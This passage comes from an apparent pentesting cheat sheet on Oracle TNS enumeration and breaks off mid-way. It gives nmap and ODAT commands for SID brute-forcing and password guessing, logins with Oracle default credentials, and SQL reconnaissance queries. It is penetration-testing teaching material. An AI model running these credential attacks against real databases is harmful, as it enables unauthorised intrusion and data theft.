1-1.23-2"/></svg> </a> <h1 id=oracle-tns-enumeration-cheat-sheet>Oracle TNS Enumeration Cheat Sheet<a class=headerlink href=#oracle-tns-enumeration-cheat-sheet title="Permanent link">&para;</a></h1> <h2 id=table-of-contents>Table of Contents<a class=headerlink href=#table-of-contents title="Permanent link">&para;</a></h2> <ol> <li><a href=#overview>Overview</a></li> <li><a href=#ports--protocols>Ports &amp; Protocols</a></li> <li><a href=#quick-discovery>Quick Discovery</a></li> <li><a href=#essential-enumeration-workflow>Essential Enumeration Workflow</a></li> <li><a href=#1-service-detection>Service Detection</a></li> <li><a href=#2-sid-enumeration>SID Enumeration</a></li> <li><a href=#3-authentication-testing>Authentication Testing</a></li> <li><a href=#4-database-interaction>Database Interaction</a></li> <li><a href=#manual-interaction>Manual Interaction</a></li> <li><a href=#sqlplus-connection>SQLPlus Connection</a></li> <li><a href=#oracle-sql-commands>Oracle SQL Commands</a></li> <li><a href=#system-information-queries>System Information Queries</a></li> <li><a href=#credential-attacks>Credential Attacks</a></li> <li><a href=#advanced-techniques>Advanced Techniques</a></li> <li><a href=#odat-framework>ODAT Framework</a></li> <li><a href=#common-vulnerabilities>Common Vulnerabilities</a></li> <li><a href=#quick-reference-commands>Quick Reference Commands</a></li> <li><a href=#testing-checklist>Testing Checklist</a></li> <li><a href=#critical-security-issues>Critical Security Issues</a></li> </ol> <hr> <h2 id=overview>Overview<a class=headerlink href=#overview title="Permanent link">&para;</a></h2> <p><strong>Oracle TNS (Transparent Network Substrate)</strong> is Oracle's proprietary networking technology that enables communication between Oracle databases and client applications. TNS serves as the foundation for Oracle Net Services and handles connection management, load balancing, and security for Oracle database connections.</p> <h3 id=key-functions>Key Functions<a class=headerlink href=#key-functions title="Permanent link">&para;</a></h3> <ul> <li><strong>Connection Management</strong>: Handles client-to-database connections</li> <li><strong>Load Balancing</strong>: Distributes connections across multiple database instances</li> <li><strong>Security</strong>: Provides encryption and authentication mechanisms</li> <li><strong>Name Resolution</strong>: Resolves service names to network addresses</li> <li><strong>Protocol Support</strong>: Supports TCP/IP, UDP, IPX/SPX protocols</li> </ul> <h3 id=why-oracle-tns-matters-in-pentesting>Why Oracle TNS Matters in Pentesting<a class=headerlink href=#why-oracle-tns-matters-in-pentesting title="Permanent link">&para;</a></h3> <ul> <li><strong>Enterprise Databases</strong>: Often contains sensitive business-critical data</li> <li><strong>Weak Authentication</strong>: Default accounts with known passwords</li> <li><strong>Privilege Escalation</strong>: Database access can lead to system compromise</li> <li><strong>File System Access</strong>: Oracle utilities allow file operations</li> <li><strong>Network Exposure</strong>: Database services accessible from network</li> </ul> <h3 id=common-attack-vectors>Common Attack Vectors<a class=headerlink href=#common-attack-vectors title="Permanent link">&para;</a></h3> <ul> <li><strong>SID Enumeration</strong>: Discovering database instance identifiers</li> <li><strong>Default Credentials</strong>: Oracle default accounts and passwords</li> <li><strong>SQL Injection</strong>: Exploiting database queries and procedures</li> <li><strong>File Upload</strong>: Uploading web shells through database utilities</li> <li><strong>Privilege Escalation</strong>: Gaining SYSDBA privileges</li> </ul> <hr> <h2 id=ports-protocols>Ports &amp; Protocols<a class=headerlink href=#ports-protocols title="Permanent link">&para;</a></h2> <div class="language-text highlight"><pre><span></span><code><span id=__span-0-1><a id=__codelineno-0-1 name=__codelineno-0-1 href=#__codelineno-0-1></a>1521/tcp - Oracle TNS Listener (default)
</span><span id=__span-0-2><a id=__codelineno-0-2 name=__codelineno-0-2 href=#__codelineno-0-2></a>1522-1529/tcp - Alternative TNS ports
</span><span id=__span-0-3><a id=__codelineno-0-3 name=__codelineno-0-3 href=#__codelineno-0-3></a>1630/tcp - Oracle Connection Manager
</span></code></pre></div> <h3 id=oracle-components>Oracle Components<a class=headerlink href=#oracle-components title="Permanent link">&para;</a></h3> <table> <thead> <tr> <th>Component</th> <th>Port</th> <th>Purpose</th> <th>Security Notes</th> </tr> </thead> <tbody> <tr> <td><strong>TNS Listener</strong></td> <td>1521/tcp</td> <td>Database connections</td> <td>Primary attack target</td> </tr> <tr> <td><strong>Oracle EM</strong></td> <td>1158/tcp</td> <td>Enterprise Manager</td> <td>Web management interface</td> </tr> <tr> <td><strong>Oracle XDB</strong></td> <td>8080/tcp</td> <td>XML DB HTTP</td> <td>Web-based database access</td> </tr> </tbody> </table> <hr> <h2 id=quick-discovery>Quick Discovery<a class=headerlink href=#quick-discovery title="Permanent link">&para;</a></h2> <div class="language-bash highlight"><pre><span></span><code><span id=__span-1-1><a id=__codelineno-1-1 name=__codelineno-1-1 href=#__codelineno-1-1></a><span class=c1># Port scan for Oracle TNS</span>
</span><span id=__span-1-2><a id=__codelineno-1-2 name=__codelineno-1-2 href=#__codelineno-1-2></a>nmap<span class=w> </span>-p<span class=w> </span><span class=m>1521</span>,1522-1529<span class=w> </span>--open<span class=w> </span>-sV<span class=w> </span>target
</span><span id=__span-1-3><a id=__codelineno-1-3 name=__codelineno-1-3 href=#__codelineno-1-3></a>
</span><span id=__span-1-4><a id=__codelineno-1-4 name=__codelineno-1-4 href=#__codelineno-1-4></a><span class=c1># Oracle-specific scripts</span>
</span><span id=__span-1-5><a id=__codelineno-1-5 name=__codelineno-1-5 href=#__codelineno-1-5></a>nmap<span class=w> </span>-p<span class=w> </span><span class=m>1521</span><span class=w> </span>--script<span class=o>=</span>oracle-*<span class=w> </span>target
</span><span id=__span-1-6><a id=__codelineno-1-6 name=__codelineno-1-6 href=#__codelineno-1-6></a>
</span><span id=__span-1-7><a id=__codelineno-1-7 name=__codelineno-1-7 href=#__codelineno-1-7></a><span class=c1># TNS version detection</span>
</span><span id=__span-1-8><a id=__codelineno-1-8 name=__codelineno-1-8 href=#__codelineno-1-8></a>nmap<span class=w> </span>-p<span class=w> </span><span class=m>1521</span><span class=w> </span>-sV<span class=w> </span>--script<span class=o>=</span>oracle-tns-version<span class=w> </span>target
</span></code></pre></div> <hr> <h2 id=essential-enumeration-workflow>Essential Enumeration Workflow<a class=headerlink href=#essential-enumeration-workflow title="Permanent link">&para;</a></h2> <h3 id=1-service-detection>1. Service Detection<a class=headerlink href=#1-service-detection title="Permanent link">&para;</a></h3> <h4 id=basic-oracle-tns-detection>Basic Oracle TNS Detection<a class=headerlink href=#basic-oracle-tns-detection title="Permanent link">&para;</a></h4> <div class="language-bash highlight"><pre><span></span><code><span id=__span-2-1><a id=__codelineno-2-1 name=__codelineno-2-1 href=#__codelineno-2-1></a><span class=c1># Standard port scan</span>
</span><span id=__span-2-2><a id=__codelineno-2-2 name=__codelineno-2-2 href=#__codelineno-2-2></a>nmap<span class=w> </span>-p<span class=w> </span><span class=m>1521</span><span class=w> </span>-sV<span class=w> </span>target
</span><span id=__span-2-3><a id=__codelineno-2-3 name=__codelineno-2-3 href=#__codelineno-2-3></a>
</span><span id=__span-2-4><a id=__codelineno-2-4 name=__codelineno-2-4 href=#__codelineno-2-4></a><span class=c1># TNS version information</span>
</span><span id=__span-2-5><a id=__codelineno-2-5 name=__codelineno-2-5 href=#__codelineno-2-5></a>nmap<span class=w> </span>-p<span class=w> </span><span class=m>1521</span><span class=w> </span>--script<span class=o>=</span>oracle-tns-version<span class=w> </span>target
</span><span id=__span-2-6><a id=__codelineno-2-6 name=__codelineno-2-6 href=#__codelineno-2-6></a>
</span><span id=__span-2-7><a id=__codelineno-2-7 name=__codelineno-2-7 href=#__codelineno-2-7></a><span class=c1># Comprehensive Oracle scan</span>
</span><span id=__span-2-8><a id=__codelineno-2-8 name=__codelineno-2-8 href=#__codelineno-2-8></a>nmap<span class=w> </span>-p<span class=w> </span><span class=m>1521</span><span class=w> </span>--script<span class=o>=</span>oracle-enum-users,oracle-sid-brute<span class=w> </span>target
</span></code></pre></div> <h4 id=alternative-port-discovery>Alternative Port Discovery<a class=headerlink href=#alternative-port-discovery title="Permanent link">&para;</a></h4> <div class="language-bash highlight"><pre><span></span><code><span id=__span-3-1><a id=__codelineno-3-1 name=__codelineno-3-1 href=#__codelineno-3-1></a><span class=c1># Scan common Oracle ports</span>
</span><span id=__span-3-2><a id=__codelineno-3-2 name=__codelineno-3-2 href=#__codelineno-3-2></a>nmap<span class=w> </span>-p<span class=w> </span><span class=m>1521</span>-1529,1630,8080<span class=w> </span>--open<span class=w> </span>-sV<span class=w> </span>target
</span><span id=__span-3-3><a id=__codelineno-3-3 name=__codelineno-3-3 href=#__codelineno-3-3></a>
</span><span id=__span-3-4><a id=__codelineno-3-4 name=__codelineno-3-4 href=#__codelineno-3-4></a><span class=c1># UDP TNS listener discovery</span>
</span><span id=__span-3-5><a id=__codelineno-3-5 name=__codelineno-3-5 href=#__codelineno-3-5></a>nmap<span class=w> </span>-sU<span class=w> </span>-p<span class=w> </span><span class=m>1521</span><span class=w> </span>target
</span></code></pre></div> <h3 id=2-sid-enumeration>2. SID Enumeration<a class=headerlink href=#2-sid-enumeration title="Permanent link">&para;</a></h3> <h4 id=nmap-sid-brute-force>Nmap SID Brute Force<a class=headerlink href=#nmap-sid-brute-force title="Permanent link">&para;</a></h4> <div class="language-bash highlight"><pre><span></span><code><span id=__span-4-1><a id=__codelineno-4-1 name=__codelineno-4-1 href=#__codelineno-4-1></a><span class=c1># Default SID enumeration</span>
</span><span id=__span-4-2><a id=__codelineno-4-2 name=__codelineno-4-2 href=#__codelineno-4-2></a>nmap<span class=w> </span>-p<span class=w> </span><span class=m>1521</span><span class=w> </span>--script<span class=o>=</span>oracle-sid-brute<span class=w> </span>target
</span><span id=__span-4-3><a id=__codelineno-4-3 name=__codelineno-4-3 href=#__codelineno-4-3></a>
</span><span id=__span-4-4><a id=__codelineno-4-4 name=__codelineno-4-4 href=#__codelineno-4-4></a><span class=c1># Custom SID wordlist</span>
</span><span id=__span-4-5><a id=__codelineno-4-5 name=__codelineno-4-5 href=#__codelineno-4-5></a>nmap<span class=w> </span>-p<span class=w> </span><span class=m>1521</span><span class=w> </span>--script<span class=o>=</span>oracle-sid-brute<span class=w> </span>--script-args<span class=w> </span>oracle-sid-brute.sid<span class=o>=</span>wordlist.txt<span class=w> </span>target
</span><span id=__span-4-6><a id=__codelineno-4-6 name=__codelineno-4-6 href=#__codelineno-4-6></a>
</span><span id=__span-4-7><a id=__codelineno-4-7 name=__codelineno-4-7 href=#__codelineno-4-7></a><span class=c1># Aggressive SID enumeration</span>
</span><span id=__span-4-8><a id=__codelineno-4-8 name=__codelineno-4-8 href=#__codelineno-4-8></a>nmap<span class=w> </span>-p<span class=w> </span><span class=m>1521</span><span class=w> </span>--script<span class=o>=</span>oracle-sid-brute<span class=w> </span>--script-args<span class=w> </span>oracle-sid-brute.aggressive<span class=o>=</span><span class=nb>true</span><span class=w> </span>target
</span></code></pre></div> <h4 id=odat-sid-discovery>ODAT SID Discovery<a class=headerlink href=#odat-sid-discovery title="Permanent link">&para;</a></h4> <div class="language-bash highlight"><pre><span></span><code><span id=__span-5-1><a id=__codelineno-5-1 name=__codelineno-5-1 href=#__codelineno-5-1></a><span class=c1># SID guessing with ODAT</span>
</span><span id=__span-5-2><a id=__codelineno-5-2 name=__codelineno-5-2 href=#__codelineno-5-2></a>./odat.py<span class=w> </span>sidguesser<span class=w> </span>-s<span class=w> </span>target
</span><span id=__span-5-3><a id=__codelineno-5-3 name=__codelineno-5-3 href=#__codelineno-5-3></a>
</span><span id=__span-5-4><a id=__codelineno-5-4 name=__codelineno-5-4 href=#__codelineno-5-4></a><span class=c1># SID guessing with custom wordlist</span>
</span><span id=__span-5-5><a id=__codelineno-5-5 name=__codelineno-5-5 href=#__codelineno-5-5></a>./odat.py<span class=w> </span>sidguesser<span class=w> </span>-s<span class=w> </span>target<span class=w> </span>--sids-file<span class=w> </span>wordlists/sid.txt
</span><span id=__span-5-6><a id=__codelineno-5-6 name=__codelineno-5-6 href=#__codelineno-5-6></a>
</span><span id=__span-5-7><a id=__codelineno-5-7 name=__codelineno-5-7 href=#__codelineno-5-7></a><span class=c1># Verbose SID enumeration</span>
</span><span id=__span-5-8><a id=__codelineno-5-8 name=__codelineno-5-8 href=#__codelineno-5-8></a>./odat.py<span class=w> </span>sidguesser<span class=w> </span>-s<span class=w> </span>target<span class=w> </span>-v
</span></code></pre></div> <h4 id=manual-sid-testing>Manual SID Testing<a class=headerlink href=#manual-sid-testing title="Permanent link">&para;</a></h4> <div class="language-bash highlight"><pre><span></span><code><span id=__span-6-1><a id=__codelineno-6-1 name=__codelineno-6-1 href=#__codelineno-6-1></a><span class=c1># Common Oracle SIDs to test</span>
</span><span id=__span-6-2><a id=__codelineno-6-2 name=__codelineno-6-2 href=#__codelineno-6-2></a><span class=nv>SIDs</span><span class=o>=</span><span class=s2>&quot;XE ORCL PLSExtProc XEXDB&quot;</span>
</span><span id=__span-6-3><a id=__codelineno-6-3 name=__codelineno-6-3 href=#__codelineno-6-3></a>
</span><span id=__span-6-4><a id=__codelineno-6-4 name=__codelineno-6-4 href=#__codelineno-6-4></a><span class=k>for</span><span class=w> </span>sid<span class=w> </span><span class=k>in</span><span class=w> </span><span class=nv>$SIDs</span><span class=p>;</span><span class=w> </span><span class=k>do</span>
</span><span id=__span-6-5><a id=__codelineno-6-5 name=__codelineno-6-5 href=#__codelineno-6-5></a><span class=w>    </span><span class=nb>echo</span><span class=w> </span><span class=s2>&quot;Testing SID: </span><span class=nv>$sid</span><span class=s2>&quot;</span>
</span><span id=__span-6-6><a id=__codelineno-6-6 name=__codelineno-6-6 href=#__codelineno-6-6></a><span class=w>    </span>sqlplus<span class=w> </span>system/manager@target:1521/<span class=nv>$sid</span>
</span><span id=__span-6-7><a id=__codelineno-6-7 name=__codelineno-6-7 href=#__codelineno-6-7></a><span class=k>done</span>
</span></code></pre></div> <h3 id=3-authentication-testing>3. Authentication Testing<a class=headerlink href=#3-authentication-testing title="Permanent link">&para;</a></h3> <h4 id=default-credentials-testing>Default Credentials Testing<a class=headerlink href=#default-credentials-testing title="Permanent link">&para;</a></h4> <div class="language-bash highlight"><pre><span></span><code><span id=__span-7-1><a id=__codelineno-7-1 name=__codelineno-7-1 href=#__codelineno-7-1></a><span class=c1># Common Oracle default accounts</span>
</span><span id=__span-7-2><a id=__codelineno-7-2 name=__codelineno-7-2 href=#__codelineno-7-2></a>sqlplus<span class=w> </span>system/manager@target:1521/XE
</span><span id=__span-7-3><a id=__codelineno-7-3 name=__codelineno-7-3 href=#__codelineno-7-3></a>sqlplus<span class=w> </span>sys/change_on_install@target:1521/XE<span class=w> </span>as<span class=w> </span>sysdba
</span><span id=__span-7-4><a id=__codelineno-7-4 name=__codelineno-7-4 href=#__codelineno-7-4></a>sqlplus<span class=w> </span>scott/tiger@target:1521/XE
</span><span id=__span-7-5><a id=__codelineno-7-5 name=__codelineno-7-5 href=#__codelineno-7-5></a>sqlplus<span class=w> </span>hr/hr@target:1521/XE
</span><span id=__span-7-6><a id=__codelineno-7-6 name=__codelineno-7-6 href=#__codelineno-7-6></a>sqlplus<span class=w> </span>dbsnmp/dbsnmp@target:1521/XE
</span><span id=__span-7-7><a id=__codelineno-7-7 name=__codelineno-7-7 href=#__codelineno-7-7></a>
</span><span id=__span-7-8><a id=__codelineno-7-8 name=__codelineno-7-8 href=#__codelineno-7-8></a><span class=c1># Test without specifying SID (uses default)</span>
</span><span id=__span-7-9><a id=__codelineno-7-9 name=__codelineno-7-9 href=#__codelineno-7-9></a>sqlplus<span class=w> </span>system/manager@target:1521
</span></code></pre></div> <h4 id=odat-password-attacks>ODAT Password Attacks<a class=headerlink href=#odat-password-attacks title="Permanent link">&para;</a></h4> <div class="language-bash highlight"><pre><span></span><code><span id=__span-8-1><a id=__codelineno-8-1 name=__codelineno-8-1 href=#__codelineno-8-1></a><span class=c1># Password guessing for specific user</span>
</span><span id=__span-8-2><a id=__codelineno-8-2 name=__codelineno-8-2 href=#__codelineno-8-2></a>./odat.py<span class=w> </span>passwordguesser<span class=w> </span>-s<span class=w> </span>target<span class=w> </span>-d<span class=w> </span>XE<span class=w> </span>-U<span class=w> </span>scott
</span><span id=__span-8-3><a id=__codelineno-8-3 name=__codelineno-8-3 href=#__codelineno-8-3></a>
</span><span id=__span-8-4><a id=__codelineno-8-4 name=__codelineno-8-4 href=#__codelineno-8-4></a><span class=c1># Brute force multiple users</span>
</span><span id=__span-8-5><a id=__codelineno-8-5 name=__codelineno-8-5 href=#__codelineno-8-5></a>./odat.py<span class=w> </span>passwordguesser<span class=w> </span>-s<span class=w> </span>target<span class=w> </span>-d<span class=w> </span>XE<span class=w> </span>--accounts-file<span class=w> </span>accounts.txt
</span><span id=__span-8-6><a id=__codelineno-8-6 name=__codelineno-8-6 href=#__codelineno-8-6></a>
</span><span id=__span-8-7><a id=__codelineno-8-7 name=__codelineno-8-7 href=#__codelineno-8-7></a><span class=c1># Custom password list</span>
</span><span id=__span-8-8><a id=__codelineno-8-8 name=__codelineno-8-8 href=#__codelineno-8-8></a>./odat.py<span class=w> </span>passwordguesser<span class=w> </span>-s<span class=w> </span>target<span class=w> </span>-d<span class=w> </span>XE<span class=w> </span>-U<span class=w> </span>system<span class=w> </span>--passwords-file<span class=w> </span>passwords.txt
</span></code></pre></div> <h3 id=4-database-interaction>4. Database Interaction<a class=headerlink href=#4-database-interaction title="Permanent link">&para;</a></h3> <h4 id=basic-connection>Basic Connection<a class=headerlink href=#basic-connection title="Permanent link">&para;</a></h4> <div class="language-bash highlight"><pre><span></span><code><span id=__span-9-1><a id=__codelineno-9-1 name=__codelineno-9-1 href=#__codelineno-9-1></a><span class=c1># Connect with discovered credentials</span>
</span><span id=__span-9-2><a id=__codelineno-9-2 name=__codelineno-9-2 href=#__codelineno-9-2></a>sqlplus<span class=w> </span>scott/tiger@target:1521/XE
</span><span id=__span-9-3><a id=__codelineno-9-3 name=__codelineno-9-3 href=#__codelineno-9-3></a>
</span><span id=__span-9-4><a id=__codelineno-9-4 name=__codelineno-9-4 href=#__codelineno-9-4></a><span class=c1># Connect as SYSDBA</span>
</span><span id=__span-9-5><a id=__codelineno-9-5 name=__codelineno-9-5 href=#__codelineno-9-5></a>sqlplus<span class=w> </span>scott/tiger@target:1521/XE<span class=w> </span>as<span class=w> </span>sysdba
</span><span id=__span-9-6><a id=__codelineno-9-6 name=__codelineno-9-6 href=#__codelineno-9-6></a>
</span><span id=__span-9-7><a id=__codelineno-9-7 name=__codelineno-9-7 href=#__codelineno-9-7></a><span class=c1># Connect using TNS alias</span>
</span><span id=__span-9-8><a id=__codelineno-9-8 name=__codelineno-9-8 href=#__codelineno-9-8></a>sqlplus<span class=w> </span>scott/tiger@target
</span></code></pre></div> <h4 id=information-gathering>Information Gathering<a class=headerlink href=#information-gathering title="Permanent link">&para;</a></h4> <div class="language-sql highlight"><pre><span></span><code><span id=__span-10-1><a id=__codelineno-10-1 name=__codelineno-10-1 href=#__codelineno-10-1></a><span class=c1>-- Database version</span>
</span><span id=__span-10-2><a id=__codelineno-10-2 name=__codelineno-10-2 href=#__codelineno-10-2></a><span class=k>SELECT</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>v$version</span><span class=p>;</span>
</span><span id=__span-10-3><a id=__codelineno-10-3 name=__codelineno-10-3 href=#__codelineno-10-3></a>
</span><span id=__span-10-4><a id=__codelineno-10-4 name=__codelineno-10-4 href=#__codelineno-10-4></a><span class=c1>-- Current user privileges</span>
</span><span id=__span-10-5><a id=__codelineno-10-5 name=__codelineno-10-5 href=#__codelineno-10-5></a><span class=k>SELECT</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>user_role_privs</span><span class=p>;</span>
</span><span id=__span-10-6><a id=__codelineno-10-6 name=__codelineno-10-6 href=#__codelineno-10-6></a>
</span><span id=__span-10-7><a id=__codelineno-10-7 name=__codelineno-10-7 href=#__codelineno-10-7></a><span class=c1>-- System information</span>
</span><span id=__span-10-8><a id=__codelineno-10-8 name=__codelineno-10-8 href=#__codelineno-10-8></a><span class=k>SELECT</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>v$instance</span><span class=p>;</span>
</span><span id=__span-10-9><a id=__codelineno-10-9 name=__codelineno-10-9 href=#__codelineno-10-9></a>
</span><span id=__span-10-10><a id=__codelineno-10-10 name=__codelineno-10-10 href=#__codelineno-10-10></a><span class=c1>-- Database name</span>
</span><span id=__span-10-11><a id=__codelineno-10-11 name=__codelineno-10-11 href=#__codelineno-10-11></a><span class=k>SELECT</span><span class=w> </span><span class=n>name</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>v$database</span><span class=p>;</span>
</span></code></pre></div> <hr> <h2 id=manual-interaction>Manual Interaction<a class=headerlink href=#manual-interaction title="Permanent link">&para;</a></h2> <h3 id=sqlplus-connection>SQLPlus Connection<a class=headerlink href=#sqlplus-connection title="Permanent link">&para;</a></h3> <h4 id=connection-syntax>Connection Syntax<a class=headerlink href=#connection-syntax title="Permanent link">&para;</a></h4> <div class="language-bash highlight"><pre><span></span><code><span id=__span-11-1><a id=__codelineno-11-1 name=__codelineno-11-1 href=#__codelineno-11-1></a><span class=c1># Standard connection</span>
</span><span id=__span-11-2><a id=__codelineno-11-2 name=__codelineno-11-2 href=#__codelineno-11-2></a>sqlplus<span class=w> </span>username/password@host:port/SID
</span><span id=__span-11-3><a id=__codelineno-11-3 name=__codelineno-11-3 href=#__codelineno-11-3></a>
</span><span id=__span-11-4><a id=__codelineno-11-4 name=__codelineno-11-4 href=#__codelineno-11-4></a><span class=c1># SYSDBA connection</span>
</span><span id=__span-11-5><a id=__codelineno-11-5 name=__codelineno-11-5 href=#__codelineno-11-5></a>sqlplus<span class=w> </span>username/password@host:port/SID<span class=w> </span>as<span class=w> </span>sysdba
</span><span id=__span-11-6><a id=__codelineno-11-6 name=__codelineno-11-6 href=#__codelineno-11-6></a>
</span><span id=__span-11-7><a id=__codelineno-11-7 name=__codelineno-11-7 href=#__codelineno-11-7></a><span class=c1># Local connection (if on same machine)</span>
</span><span id=__span-11-8><a id=__codelineno-11-8 name=__codelineno-11-8 href=#__codelineno-11-8></a>sqlplus<span class=w> </span>username/password
</span><span id=__span-11-9><a id=__codelineno-11-9 name=__codelineno-11-9 href=#__codelineno-11-9></a>
</span><span id=__span-11-10><a id=__codelineno-11-10 name=__codelineno-11-10 href=#__codelineno-11-10></a><span class=c1># Connection with specific role</span>
</span><span id=__span-11-11><a id=__codelineno-11-11 name=__codelineno-11-11 href=#__codelineno-11-11></a>sqlplus<span class=w> </span>username/password@host:port/SID<span class=w> </span>as<span class=w> </span>sysoper
</span></code></pre></div> <h4 id=connection-troubleshooting>Connection Troubleshooting<a class=headerlink href=#connection-troubleshooting title="Permanent link">&para;</a></h4> <div class="language-bash highlight"><pre><span></span><code><span id=__span-12-1><a id=__codelineno-12-1 name=__codelineno-12-1 href=#__codelineno-12-1></a><span class=c1># Fix library path issues</span>
</span><span id=__span-12-2><a id=__codelineno-12-2 name=__codelineno-12-2 href=#__codelineno-12-2></a><span class=nb>export</span><span class=w> </span><span class=nv>LD_LIBRARY_PATH</span><span class=o>=</span>/opt/oracle/instantclient_21_4:<span class=nv>$LD_LIBRARY_PATH</span>
</span><span id=__span-12-3><a id=__codelineno-12-3 name=__codelineno-12-3 href=#__codelineno-12-3></a><span class=nb>export</span><span class=w> </span><span class=nv>PATH</span><span class=o>=</span><span class=nv>$LD_LIBRARY_PATH</span>:<span class=nv>$PATH</span>
</span><span id=__span-12-4><a id=__codelineno-12-4 name=__codelineno-12-4 href=#__codelineno-12-4></a>
</span><span id=__span-12-5><a id=__codelineno-12-5 name=__codelineno-12-5 href=#__codelineno-12-5></a><span class=c1># Configure TNS_ADMIN</span>
</span><span id=__span-12-6><a id=__codelineno-12-6 name=__codelineno-12-6 href=#__codelineno-12-6></a><span class=nb>export</span><span class=w> </span><span class=nv>TNS_ADMIN</span><span class=o>=</span>/opt/oracle/instantclient_21_4/network/admin
</span><span id=__span-12-7><a id=__codelineno-12-7 name=__codelineno-12-7 href=#__codelineno-12-7></a>
</span><span id=__span-12-8><a id=__codelineno-12-8 name=__codelineno-12-8 href=#__codelineno-12-8></a><span class=c1># Test connection without authentication</span>
</span><span id=__span-12-9><a id=__codelineno-12-9 name=__codelineno-12-9 href=#__codelineno-12-9></a>sqlplus<span class=w> </span>/nolog
</span><span id=__span-12-10><a id=__codelineno-12-10 name=__codelineno-12-10 href=#__codelineno-12-10></a>SQL&gt;<span class=w> </span>connect<span class=w> </span>username/password@host:port/SID
</span></code></pre></div> <h3 id=oracle-sql-commands>Oracle SQL Commands<a class=headerlink href=#oracle-sql-commands title="Permanent link">&para;</a></h3> <h4 id=basic-information-queries>Basic Information Queries<a class=headerlink href=#basic-information-queries title="Permanent link">&para;</a></h4> <div class="language-sql highlight"><pre><span></span><code><span id=__span-13-1><a id=__codelineno-13-1 name=__codelineno-13-1 href=#__codelineno-13-1></a><span class=c1>-- Database version and edition</span>
</span><span id=__span-13-2><a id=__codelineno-13-2 name=__codelineno-13-2 href=#__codelineno-13-2></a><span class=k>SELECT</span><span class=w> </span><span class=n>banner</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>v$version</span><span class=p>;</span>
</span><span id=__span-13-3><a id=__codelineno-13-3 name=__codelineno-13-3 href=#__codelineno-13-3></a>
</span><span id=__span-13-4><a id=__codelineno-13-4 name=__codelineno-13-4 href=#__codelineno-13-4></a><span class=c1>-- Current user information</span>
</span><span id=__span-13-5><a id=__codelineno-13-5 name=__codelineno-13-5 href=#__codelineno-13-5></a><span class=k>SELECT</span><span class=w> </span><span class=k>user</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>dual</span><span class=p>;</span>
</span><span id=__span-13-6><a id=__codelineno-13-6 name=__codelineno-13-6 href=#__codelineno-13-6></a><span class=k>SELECT</span><span class=w> </span><span class=n>sys_context</span><span class=p>(</span><span class=s1>&#39;USERENV&#39;</span><span class=p>,</span><span class=w> </span><span class=s1>&#39;CURRENT_USER&#39;</span><span class=p>)</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>dual</span><span class=p>;</span>
</span><span id=__span-13-7><a id=__codelineno-13-7 name=__codelineno-13-7 href=#__codelineno-13-7></a>
</span><span id=__span-13-8><a id=__codelineno-13-8 name=__codelineno-13-8 href=#__codelineno-13-8></a><span class=c1>-- Session information</span>
</span><span id=__span-13-9><a id=__codelineno-13-9 name=__codelineno-13-9 href=#__codelineno-13-9></a><span class=k>SELECT</span><span class=w> </span><span class=n>sys_context</span><span class=p>(</span><span class=s1>&#39;USERENV&#39;</span><span class=p>,</span><span class=w> </span><span class=s1>&#39;SESSION_USER&#39;</span><span class=p>)</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>dual</span><span class=p>;</span>
</span><span id=__span-13-10><a id=__codelineno-13-10 name=__codelineno-13-10 href=#__codelineno-13-10></a><span class=k>SELECT</span><span class=w> </span><span class=n>sys_context</span><span class=p>(</span><span class=s1>&#39;USERENV&#39;</span><span class=p>,</span><span class=w> </span><span class=s1>&#39;IP_ADDRESS&#39;</span><span class=p>)</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>dual</span><span class=p>;</span>
</span><span id=__span-13-11><a id=__codelineno-13-11 name=__codelineno-13-11 href=#__codelineno-13-11></a>
</span><span id=__span-13-12><a id=__codelineno-13-12 name=__codelineno-13-12 href=#__codelineno-13-12></a><span class=c1>-- Database information</span>
</span><span id=__span-13-13><a id=__codelineno-13-13 name=__codelineno-13-13 href=#__codelineno-13-13></a><span class=k>SELECT</span><span class=w> </span><span class=n>name</span><span class=p>,</span><span class=w> </span><span class=n>created</span><span class=p>,</span><span class=w> </span><span class=n>log_mode</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>v$database</span><span class=p>;</span>
</span><span id=__span-13-14><a id=__codelineno-13-14 name=__codelineno-13-14 href=#__codelineno-13-14></a><span class=k>SELECT</span><span class=w> </span><span class=n>instance_name</span><span class=p>,</span><span class=w> </span><span class=n>host_name</span><span class=p>,</span><span class=w> </span><span class=n>status</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>v$instance</span><span class=p>;</span>
</span></code></pre></div> <h4 id=user-and-privilege-enumeration>User and Privilege Enumeration<a class=headerlink href=#user-and-privilege-enumeration title="Permanent link">&para;</a></h4> <div class="language-sql highlight"><pre><span></span><code><span id=__span-14-1><a id=__codelineno-14-1 name=__codelineno-14-1 href=#__codelineno-14-1></a><span class=c1>-- List all users</span>
</span><span id=__span-14-2><a id=__codelineno-14-2 name=__codelineno-14-2 href=#__codelineno-14-2></a><span class=k>SELECT</span><span class=w> </span><span class=n>username</span><span class=p>,</span><span class=w> </span><span class=n>account_status</span><span class=p>,</span><span class=w> </span><span class=n>created</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>dba_users</span><span class=p>;</span>
</span><span id=__span-14-3><a id=__codelineno-14-3 name=__codelineno-14-3 href=#__codelineno-14-3></a>
</span><span id=__span-14-4><a id=__codelineno-14-4 name=__codelineno-14-4 href=#__codelineno-14-4></a><span class=c1>-- Current user privileges</span>
</span><span id=__span-14-5><a id=__codelineno-14-5 name=__codelineno-14-5 href=#__codelineno-14-5></a><span class=k>SELECT</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>user_role_privs</span><span class=p>;</span>
</span><span id=__span-14-6><a id=__codelineno-14-6 name=__codelineno-14-6 href=#__codelineno-14-6></a><span class=k>SELECT</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>user_sys_privs</span><span class=p>;</span>
</span><span id=__span-14-7><a id=__codelineno-14-7 name=__codelineno-14-7 href=#__codelineno-14-7></a>
